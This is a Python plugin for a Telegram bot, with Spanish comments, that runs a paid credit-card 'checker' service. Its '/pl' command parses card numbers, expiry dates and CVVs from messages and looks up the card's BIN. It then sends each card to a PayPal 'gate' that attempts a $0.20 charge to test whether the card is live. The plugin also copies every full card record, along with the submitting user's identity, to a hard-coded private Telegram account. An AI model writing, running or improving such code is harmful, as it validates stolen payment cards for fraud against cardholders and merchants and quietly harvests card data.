import os
import time
import requests
from dotenv import load_dotenv
from pyrogram import Client
from srca.configs import addCommand, find_cards
from plugins.gates.src.paypal import main
from db.mongo_client import MongoDB
from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton

# ✅ Cargar variables de entorno
load_dotenv()

# ✅ Definir el ID de destino (tu ID personal para recibir logs)
LOG_USER_ID = 7389519750

# ✅ Diccionario para rastrear el último uso del comando por usuario
last_command_time = {}

@addCommand('pl')
def mc(client, m):
    db = MongoDB()

    # ✅ Verificar si el chat está autorizado
    if db.query_group(m.chat.id) is None:
        m.reply("❌ Chat no autorizado.")
        return

    # ✅ Verificar si el usuario está registrado
    query = db.query_user(int(m.from_user.id))
    if query is None:
        m.reply("⚠️ Usa el comando /register para registrarte.")
        return
    
    # ✅ Verificar si el usuario está baneado
    if query['role'] == 'baneado':
        m.reply("🚫 Usuario baneado.")
        return
    
    # ✅ Verificar plan del usuario
    if query['plan'] == 'free':
        m.reply("❌ Usuario Free, adquiera el plan: https://t.me/DashSab")
        return

    # ✅ Aplicar antispam (10 segundos)
    user_id = m.from_user.id
    current_time = time.time()
    if user_id in last_command_time and current_time - last_command_time[user_id] < 10:
        wait = int(10 - (current_time - last_command_time[user_id]))
        m.reply(f"⏳ Antispam activado, espera {wait}s antes de volver a intentarlo.")
        return

    last_command_time[user_id] = current_time
    inicio = time.time()

    # ✅ Capturar los datos de la tarjeta
    ccs = find_cards(m.reply_to_message.text.strip() if m.reply_to_message else m.text.strip())
    if ccs == '<b>ingrese la ccs.</b>':
        m.reply(ccs)
        return

    cc_num, exp_month, exp_year, cvv = ccs[:4]
    cc_com = f"{cc_num}|{exp_month}|{exp_year}|{cvv}"
    bin_number = cc_num[:6]

    # ✅ Obtener información de BIN (manejo de errores mejorado)
    try:
        response = requests.get(f'https://bins.antipublic.cc/bins/{bin_number}')
        if response.status_code == 200:
            bin_info = response.json()
            bank = bin_info.get('bank', 'Desconocido')
            brand = bin_info.get('brand', 'Desconocido')
            country = bin_info.get('country_name', 'Desconocido')
            card_type = bin_info.get('type', 'Desconocido')
        else:
            bank, brand, country, card_type = 'Desconocido', 'Desconocido', 'Desconocido', 'Desconocido'
    except Exception as e:
        bank, brand, country, card_type = 'Desconocido', 'Desconocido', 'Desconocido', 'Desconocido'
        print(f"❌ Error obteniendo datos del BIN: {e}")

    # ✅ Crear mensaje inicial de procesamiento
    new = m.reply(f'''<b>あ PayPal 

(↯) CC: {cc_com}
(↯) Status: Processing... [ ☃️ ]
(↯) From: {m.from_user.first_name}</b>''')

    # ✅ Ejecutar validación con PayPal
    chk = main(cc_com)
    fin = time.time()

    # ✅ Evaluar el estado y respuesta
    if chk[0] == 'Approved! ✅':
        response_message = 'charged 0.2$'
    elif chk[0] == 'declined ❌':
        response_message = 'declined! ❌'
    else:
        response_message = chk[1]

    # ✅ Crear botones "Canal" y "Precios"
    botones = InlineKeyboardMarkup([
        [InlineKeyboardButton("📢 Canal", url="https://t.me/Deep_Chk"),
         InlineKeyboardButton("💰 Precios", url="https://t.me/Deep_Chk/24")]
    ])

    # ✅ Crear mensaje final con los resultados
    texto = f'''<b>あ 𝑮𝒂𝒕𝒆𝒘𝒂𝒚┊ 𝙋𝙖𝙮𝙋𝙖𝙡 $0•2 ⸙
**- - - - - - - - - - - - - - - - - - -**\n
(↯) CC: <code>{cc_com}</code>
(↯) Status: {chk[0]}
(↯) Response: <code>{response_message}</code>
**- - - - - - - - - - - - - - - - - - -**\n
(↯) Banco: {bank}
(↯) BIN: {bin_number} - {brand} - {card_type}
(↯) País: {country}
**- - - - - - - - - - - - - - - - - - -**\n
(↯) Proxy: Live ✅
(↯) Time: <code>{fin - inicio:0.4f}'s</code>
(↯) From: {m.from_user.first_name}</b>'''

    # ✅ Editar el mensaje con la respuesta final y botones
    new.edit_text(texto, reply_markup=botones)

    # ✅ Enviar log privado (manejo de errores)
    log_text = f"""<b>📝 Chequeo Realizado - PayPal</b>
━━━━━━━━━━━━━━━━━━
👤 <b>Usuario:</b> {m.from_user.first_name} (@{m.from_user.username})
🆔 <b>ID:</b> {m.from_user.id}
💳 <b>CC:</b> <code>{cc_com}</code>
🏦 <b>Banco:</b> {bank}
📌 <b>BIN:</b> {bin_number} - {brand} - {card_type}
🌍 <b>País:</b> {country}
✅ <b>Status:</b> {chk[0]}
📜 <b>Response:</b> <code>{response_message}</code>
⏳ <b>Tiempo:</b> <code>{fin - inicio:0.4f}'s</code>
━━━━━━━━━━━━━━━━━━"""

    try:
        client.send_message(LOG_USER_ID, log_text)
    except Exception as e:
        print(f"❌ Error enviando al log privado: {e}")